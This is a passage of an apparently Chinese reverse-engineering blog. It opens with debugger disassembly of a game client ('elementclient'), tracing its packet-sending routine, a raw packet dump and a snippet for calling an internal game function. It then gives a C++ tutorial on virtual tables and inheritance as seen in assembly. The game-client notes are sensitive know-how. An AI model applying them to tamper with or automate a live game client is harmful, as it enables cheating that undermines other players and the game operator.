class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00B5A8AA - FF 77 0C  - push [edi+0C]</span><br><span class=\"line\"></span><br><span class=\"line\">00B5BC9F - FF 77 0C  - push [edi+0C]</span><br><span class=\"line\">00B5BC97             | 8B5D 0C               | mov ebx,dword ptr ss:[ebp+C]          | 0</span><br><span class=\"line\">00B5BC9A             | 8B4D E0               | mov ecx,dword ptr ss:[ebp-20]         | 1C58A028 1C58A028</span><br><span class=\"line\">00B5BC9D             | 6A 01                 | push 1                                | 1</span><br><span class=\"line\">00B5BC9F             | FF77 0C               | push dword ptr ds:[edi+C]             | 710</span><br><span class=\"line\">00B5BCA2             | 81C1 EC000000         | add ecx,EC                            |</span><br><span class=\"line\">00B5BCA8             | 53                    | push ebx                              |</span><br><span class=\"line\">00B5BCA9             | 6A 00                 | push 0                                | 0</span><br><span class=\"line\">00B5BCAB             | E8 9025E5FF           | call elementclient.9AE240             | 0</span><br><span class=\"line\"></span><br><span class=\"line\">push 1</span><br><span class=\"line\">push 710</span><br><span class=\"line\">mov ecx,1C58A028</span><br><span class=\"line\">add ecx,0x0EC</span><br><span class=\"line\">push 0</span><br><span class=\"line\">push 0</span><br><span class=\"line\">call 9AE240</span><br><span class=\"line\"></span><br><span class=\"line\">00B34C9D - 39 43 0C  - cmp [ebx+0C],eax</span><br><span class=\"line\"></span><br><span class=\"line\">00D7CC65             | 6A 00                 | push 0                                |</span><br><span class=\"line\">00D7CC67             | 6A 01                 | push 1                                |</span><br><span class=\"line\">00D7CC69             | 68 61CE2F01           | push elementclient.12FCE61            |</span><br><span class=\"line\">00D7CC6E             | FF35 64DF5001         | push dword ptr ds:[150DF64]           |</span><br><span class=\"line\">00D7CC74             | FF15 488A1E01         | call dword ptr ds:[&lt;&amp;send&gt;]           |</span><br><span class=\"line\"></span><br><span class=\"line\">00D7CBA1             | FF75 10               | push dword ptr ss:[ebp+10]            |</span><br><span class=\"line\">00D7CBA4             | FF75 0C               | push dword ptr ss:[ebp+C]             |</span><br><span class=\"line\">00D7CBA7             | E8 24000000           | call elementclient.D7CBD0             |</span><br><span class=\"line\"></span><br><span class=\"line\">00D7D8FC             | FF75 0C               | push dword ptr ss:[ebp+C]             |</span><br><span class=\"line\">00D7D8FF             | 8B8E AC000000         | mov ecx,dword ptr ds:[esi+AC]         |</span><br><span class=\"line\">00D7D905             | 57                    | push edi                              |</span><br><span class=\"line\">00D7D906             | FFB6 B0000000         | push dword ptr ds:[esi+B0]            |</span><br><span class=\"line\">00D7D90C             | E8 0FF2FFFF           | call elementclient.D7CB20             |</span><br><span class=\"line\"></span><br><span class=\"line\">00D7D701             | 66:8906               | mov word ptr ds:[esi],ax              | esi:L&quot;萨ā&quot;</span><br><span class=\"line\">00D7D704             | 6A 00                 | push 0                                |</span><br><span class=\"line\">00D7D706             | 8D45 DC               | lea eax,dword ptr ss:[ebp-24]         |</span><br><span class=\"line\">00D7D709             | 8BCF                  | mov ecx,edi                           | 1C58A028</span><br><span class=\"line\">00D7D70B             | 50                    | push eax                              |</span><br><span class=\"line\">00D7D70C             | E8 9F000000           | call elementclient.D7D7B0             |</span><br><span class=\"line\"></span><br><span class=\"line\">//send packet</span><br><span class=\"line\">00CD2984             | 8A4D 08               | mov cl,byte ptr ss:[ebp+8]            |</span><br><span class=\"line\">00CD2987             | B8 28000000           | mov eax,28                            | 28:&#x27;(&#x27;</span><br><span class=\"line\">00CD298C             | 66:8906               | mov word ptr ds:[esi],ax              |</span><br><span class=\"line\">00CD298F             | 0FB645 0C             | movzx eax,byte ptr ss:[ebp+C]         |</span><br><span class=\"line\">00CD2993             | 66:8946 04            | mov word ptr ds:[esi+4],ax            |</span><br><span class=\"line\">00CD2997             | 8B45 10               | mov eax,dword ptr ss:[ebp+10]         |</span><br><span class=\"line\">00CD299A             | 8946 06               | mov dword ptr ds:[esi+6],eax          |</span><br><span class=\"line\">00CD299D             | 8A45 14               | mov al,byte ptr ss:[ebp+14]           |</span><br><span class=\"line\">00CD29A0             | 884E 02               | mov byte ptr ds:[esi+2],cl            |</span><br><span class=\"line\">00CD29A3             | 8846 03               | mov byte ptr ds:[esi+3],al            |</span><br><span class=\"line\">00CD29A6             | 8B0D 20205001         | mov ecx,dword ptr ds:[1502020]        |</span><br><span class=\"line\">00CD29AC             | 6A 0A                 | push A                                | 包长度</span><br><span class=\"line\">00CD29AE             | 56                    | push esi                              | 数据</span><br><span class=\"line\">00CD29AF             | 8B49 20               | mov ecx,dword ptr ds:[ecx+20]         |</span><br><span class=\"line\">00CD29B2             | E8 C9AC0A00           | call elementclient.D7D680             |</span><br><span class=\"line\"></span><br><span class=\"line\">00A4B758             | 50                    | push eax                              |</span><br><span class=\"line\">00A4B759             | A3 CC235001           | mov dword ptr ds:[15023CC],eax        |</span><br><span class=\"line\">00A4B75E             | E8 AD432800           | call elementclient.CCFB10             |</span><br><span class=\"line\"></span><br><span class=\"line\">00A408FE             | C787 D4040000 FA00000 | mov dword ptr ds:[edi+4D4],FA         | edi+4D4:L&quot; &quot;</span><br><span class=\"line\">00A40908             | FFB7 D4040000         | push dword ptr ds:[edi+4D4]           | edi+4D4:L&quot; &quot;</span><br><span class=\"line\">00A4090E             | 8B4F 1C               | mov ecx,dword ptr ds:[edi+1C]         |</span><br><span class=\"line\">00A40911             | E8 EAAA0000           | call elementclient.A4B400             |</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">009AE282             | FF75 14               | push dword ptr ss:[ebp+14]            |</span><br><span class=\"line\">009AE285             | 8911                  | mov dword ptr ds:[ecx],edx            |</span><br><span class=\"line\">009AE287             | FF75 10               | push dword ptr ss:[ebp+10]            |</span><br><span class=\"line\">009AE28A             | FF75 0C               | push dword ptr ss:[ebp+C]             |</span><br><span class=\"line\">009AE28D             | FF75 08               | push dword ptr ss:[ebp+8]             |</span><br><span class=\"line\">009AE290             | E8 DB463200           | call elementclient.CD2970             |</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">04B6E034 28 00 00 01 00 00 10 07 00 00 DE FF 3F 01 28 E0 (.........Þÿ?.(à </span><br><span class=\"line\">0028 0100 0000 0710  0000</span><br></pre></td></tr></table></figure>\n<h2 id=\"从逆向的角度看c\"><a class=\"markdownIt-Anchor\" href=\"#从逆向的角度看c\">#</a> 从逆向的角度看 C++</h2>\n<h3 id=\"虚函数\"><a class=\"markdownIt-Anchor\" href=\"#虚函数\">#</a> 虚函数</h3>\n<ul>\n<li><strong>虚函数地址表（虚表）</strong></li>\n</ul>\n<ol>\n<li>\n<ol>\n<li>定义：当类中定义有虚函数时，编译器会把该类中所有虚函数的首地址保存在一张地址表中，即虚函数地址表。</li>\n<li>虚表信息在编译后被链接到执行文件中，因此所获得的虚表地址是一个固定的地址。</li>\n<li>虚表中虚函数的地址排列顺序依据虚函数在类中的声明顺序而定。</li>\n</ol>\n</li>\n</ol>\n<ul>\n<li>\n<p><strong>虚表指针</strong></p>\n</li>\n<li>\n<ul>\n<li>同时编译器还会在类的每个对象添加一个隐藏数据成员，称为虚表指针，保存着虚表的首地址，用于记录和查找虚函数。</li>\n<li>虚表指针的初始化是通过编译器在构造函数中插入代码实现的。由于必须初始化虚表指针，编译器会提供默认的构造函数。</li>\n</ul>\n</li>\n<li>\n<p><strong>虚函数调用过程</strong></p>\n</li>\n<li>\n<ul>\n<li>虚表间接寻址访问：<br>\n使用对象的指针或引用调用虚函数。根据对象的首地址，取出相应的虚表指针，在虚表查找对应的虚函数的首地址，并调用执行。</li>\n<li>直接调用访问：<br>\n使用对象调用虚函数，和调用普通成员函数一样。</li>\n<li>虚函数的识别：</li>\n<li>类中隐式定义一个数据成员</li>\n<li>数据成员在首地址处，占 4 字节</li>\n<li>构造函数初始化该数据成员为某个数组的首地址</li>\n<li>地址属于数据区，相对固定的地址</li>\n<li>数组的成员是函数指针</li>\n<li>函数被调用方式是 thiscall</li>\n<li>构造函数与析构函数都会将虚表指针设置为当前对象所属类中的虚表地址。</li>\n<li>构造函数中是完成虚表指针的初始化，此时虚表指针并没有指向虚表函数。</li>\n<li>执行析构函数时，其对象的虚表指针已经指向某个虚表首地址。虚函数是在还原虚表指针，让其指向自身的虚表首地址，防止在析构函数中调用虚函数时取到非自身虚表</li>\n</ul>\n</li>\n</ul>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1654326102652-35f05218-3401-41f7-a10f-3e70d9aed416.png\" alt=\"img\"></p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1654326120551-f6cd8e66-fc26-40bd-8d23-a8f6b93c7805.png\" alt=\"img\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">class base_class</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">private:</span><br><span class=\"line\">    int m_base;</span><br><span class=\"line\">public:</span><br><span class=\"line\">    virtual void v_func1()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        cout &lt;&lt; &quot;This is base_class&#x27;s v_func1()&quot; &lt;&lt; endl;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    virtual void v_func2()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        cout &lt;&lt; &quot;This is base_class&#x27;s v_func2()&quot; &lt;&lt; endl;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    virtual void v_func3()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        cout &lt;&lt; &quot;This is base_class&#x27;s v_func3()&quot; &lt;&lt; endl;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tbase_class Myclass;</span><br><span class=\"line\">\tMyclass.v_func1();</span><br><span class=\"line\">\tMyclass.v_func2();</span><br><span class=\"line\">\tMyclass.v_func3();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>对应的汇编为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000A1520 &gt;  55              push    ebp</span><br><span class=\"line\">000A1521    8BEC            mov     ebp,esp</span><br><span class=\"line\">000A1523    81EC D0000000   sub     esp,0xD0</span><br><span class=\"line\">000A1529    53              push    ebx</span><br><span class=\"line\">000A152A    56              push    esi</span><br><span class=\"line\">000A152B    57              push    edi</span><br><span class=\"line\">000A152C    8DBD 30FFFFFF   lea     edi,dword ptr ss:[ebp-0xD0]</span><br><span class=\"line\">000A1532    B9 34000000     mov     ecx,0x34</span><br><span class=\"line\">000A1537    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">000A153C    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">000A153E    8D4D F4         lea     ecx,dword ptr ss:[ebp-0xC]</span><br><span class=\"line\">000A1541    E8 A4FCFFFF     call    000A11EA</span><br><span class=\"line\"></span><br><span class=\"line\">000A1546    8D4D F4         lea     ecx,dword ptr ss:[ebp-0xC]</span><br><span class=\"line\">000A1549    E8 D0FAFFFF     call    000A101E</span><br><span class=\"line\"></span><br><span class=\"line\">000A154E    8D4D F4         lea     ecx,dword ptr ss:[ebp-0xC]</span><br><span class=\"line\">000A1551    E8 62FCFFFF     call    000A11B8</span><br><span class=\"line\"></span><br><span class=\"line\">000A1556    8D4D F4         lea     ecx,dword ptr ss:[ebp-0xC]</span><br><span class=\"line\">000A1559    E8 3CFCFFFF     call    000A119A</span><br><span class=\"line\"></span><br><span class=\"line\">000A155E    33C0            xor     eax,eax</span><br><span class=\"line\">000A1560    52              push    edx</span><br><span class=\"line\">000A1561    8BCD            mov     ecx,ebp</span><br><span class=\"line\">000A1563    50              push    eax</span><br><span class=\"line\">000A1564    8D15 88150A00   lea     edx,dword ptr ds:[0xA1588]</span><br><span class=\"line\">000A156A    E8 4FFBFFFF     call    000A10BE</span><br><span class=\"line\">000A156F    58              pop     eax</span><br><span class=\"line\">000A1570    5A              pop     edx</span><br><span class=\"line\">000A1571    5F              pop     edi</span><br><span class=\"line\">000A1572    5E              pop     esi</span><br><span class=\"line\">000A1573    5B              pop     ebx</span><br><span class=\"line\">000A1574    81C4 D0000000   add     esp,0xD0</span><br><span class=\"line\">000A157A    3BEC            cmp     ebp,esp</span><br><span class=\"line\">000A157C    E8 50FCFFFF     call    000A11D1</span><br><span class=\"line\">000A1581    8BE5            mov     esp,ebp</span><br><span class=\"line\">000A1583    5D              pop     ebp</span><br><span class=\"line\">000A1584    C3              retn</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//000A11EA处的代码为</span><br><span class=\"line\">013E11EA   /E9 61050000     jmp     base_class::base_class</span><br><span class=\"line\"></span><br><span class=\"line\">013E1750 &gt;  55              push    ebp</span><br><span class=\"line\">013E1751    8BEC            mov     ebp,esp</span><br><span class=\"line\">013E1753    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">013E1759    53              push    ebx</span><br><span class=\"line\">013E175A    56              push    esi</span><br><span class=\"line\">013E175B    57              push    edi</span><br><span class=\"line\">013E175C    51              push    ecx</span><br><span class=\"line\">013E175D    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">013E1763    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">013E1768    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">013E176D    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">013E176F    59              pop     ecx</span><br><span class=\"line\">013E1770    894D F8         mov     dword ptr ss:[ebp-0x8],ecx</span><br><span class=\"line\">013E1773    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">013E1776    C700 7C783E01   mov     dword ptr ds:[eax],offset base_class::`vftable&#x27;</span><br><span class=\"line\">//此处为虚表的虚表指针eax中的值就是vftable的指针</span><br><span class=\"line\">013E177C    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">013E177F    5F              pop     edi</span><br><span class=\"line\">013E1780    5E              pop     esi</span><br><span class=\"line\">013E1781    5B              pop     ebx</span><br><span class=\"line\">013E1782    8BE5            mov     esp,ebp</span><br><span class=\"line\">013E1784    5D              pop     ebp</span><br><span class=\"line\">013E1785    C3              retn</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//000A101E处的代码为</span><br><span class=\"line\">013E101E   /E9 AD050000     jmp     base_class::v_func1</span><br><span class=\"line\"></span><br><span class=\"line\">013E15D0 &gt;  55              push    ebp</span><br><span class=\"line\">013E15D1    8BEC            mov     ebp,esp</span><br><span class=\"line\">013E15D3    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">013E15D9    53              push    ebx</span><br><span class=\"line\">013E15DA    56              push    esi</span><br><span class=\"line\">013E15DB    57              push    edi</span><br><span class=\"line\">013E15DC    51              push    ecx</span><br><span class=\"line\">013E15DD    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">013E15E3    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">013E15E8    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">013E15ED    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">013E15EF    59              pop     ecx</span><br><span class=\"line\">013E15F0    894D F8         mov     dword ptr ss:[ebp-0x8],ecx</span><br><span class=\"line\">013E15F3    8BF4            mov     esi,esp</span><br><span class=\"line\">013E15F5    A1 10B33E01     mov     eax,dword ptr ds:[&lt;&amp;MSVCP90D.std::endl&gt;]</span><br><span class=\"line\">013E15FA    50              push    eax</span><br><span class=\"line\">013E15FB    68 00783E01     push    013E7800                                                                                     ; ASCII 54,&quot;his is base_class&#x27;s v_func1()&quot;</span><br><span class=\"line\">013E1600    8B0D 0CB33E01   mov     ecx,dword ptr ds:[&lt;&amp;MSVCP90D.std::cout&gt;]                                                     ; msvcp90d.std::cout</span><br><span class=\"line\">013E1606    51              push    ecx</span><br><span class=\"line\">013E1607    E8 6BFBFFFF     call    013E1177</span><br><span class=\"line\">013E160C    83C4 08         add     esp,0x8</span><br><span class=\"line\">013E160F    8BC8            mov     ecx,eax</span><br><span class=\"line\">013E1611    FF15 08B33E01   call    dword ptr ds:[&lt;&amp;MSVCP90D.std::basic_ostream&lt;char,std::char_traits&lt;char&gt; &gt;::operator&lt;&lt;&gt;]      ; msvcp90d.std::basic_ostream&lt;wchar_t,std::char_traits&lt;wchar_t&gt; &gt;::operator&lt;&lt;</span><br><span class=\"line\">013E1617    3BF4            cmp     esi,esp</span><br><span class=\"line\">013E1619    E8 B3FBFFFF     call    013E11D1</span><br><span class=\"line\">013E161E    5F              pop     edi</span><br><span class=\"line\">013E161F    5E              pop     esi</span><br><span class=\"line\">013E1620    5B              pop     ebx</span><br><span class=\"line\">013E1621    81C4 CC000000   add     esp,0xCC</span><br><span class=\"line\">013E1627    3BEC            cmp     ebp,esp</span><br><span class=\"line\">013E1629    E8 A3FBFFFF     call    013E11D1</span><br><span class=\"line\">013E162E    8BE5            mov     esp,ebp</span><br><span class=\"line\">013E1630    5D              pop     ebp</span><br><span class=\"line\">013E1631    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\">000A11B8</span><br><span class=\"line\">000A119A</span><br><span class=\"line\">分别是func2和func3的代码</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109211943483.png\" alt=\"image-20221109211943483\"></p>\n<h3 id=\"debug版本和release版本\"><a class=\"markdownIt-Anchor\" href=\"#debug版本和release版本\">#</a> debug 版本和 release 版本</h3>\n<p>debug 版本：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109212625495.png\" alt=\"image-20221109212625495\"></p>\n<p>release 版本</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109212653171.png\" alt=\"image-20221109212653171\"></p>\n<p>debug main</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1654330003859-a991baf8-cefe-46fb-83c2-602148a95ba5.png\" alt=\"img\"></p>\n<p>release main</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109213010383.png\" alt=\"image-20221109213010383\"></p>\n<p>对于刚刚的虚函数</p>\n<p>debug</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109213138880.png\" alt=\"image-20221109213138880\"></p>\n<p>release</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109213209477.png\" alt=\"image-20221109213209477\"></p>\n<h3 id=\"c中类与继承在汇编中的关系\"><a class=\"markdownIt-Anchor\" href=\"#c中类与继承在汇编中的关系\">#</a> C++ 中类与继承在汇编中的关系</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">class employee</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">\temployee() &#123; printf(&quot;employee()!\\n&quot;);&#125;</span><br><span class=\"line\">\t~employee() &#123; printf(&quot;~employee()!\\n&quot;);&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\">class manager : public employee</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">\tmanager() &#123; printf(&quot;manager()!\\n&quot;);&#125;</span><br><span class=\"line\">\t~manager() &#123;  printf(&quot;~maneger()!\\n&quot;);&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tmanager my;</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">010D13D0 &gt;  55              push    ebp</span><br><span class=\"line\">010D13D1    8BEC            mov     ebp,esp</span><br><span class=\"line\">010D13D3    81EC D8000000   sub     esp,0xD8</span><br><span class=\"line\">010D13D9    53              push    ebx</span><br><span class=\"line\">010D13DA    56              push    esi</span><br><span class=\"line\">010D13DB    57              push    edi</span><br><span class=\"line\">010D13DC    8DBD 28FFFFFF   lea     edi,dword ptr ss:[ebp-0xD8]</span><br><span class=\"line\">010D13E2    B9 36000000     mov     ecx,0x36</span><br><span class=\"line\">010D13E7    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">010D13EC    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">//堆栈操作</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">010D13EE    8D4D FB         lea     ecx,dword ptr ss:[ebp-0x5]</span><br><span class=\"line\">010D13F1    E8 22FDFFFF     call    010D1118</span><br><span class=\"line\">//010D1118   /E9 63030000     jmp     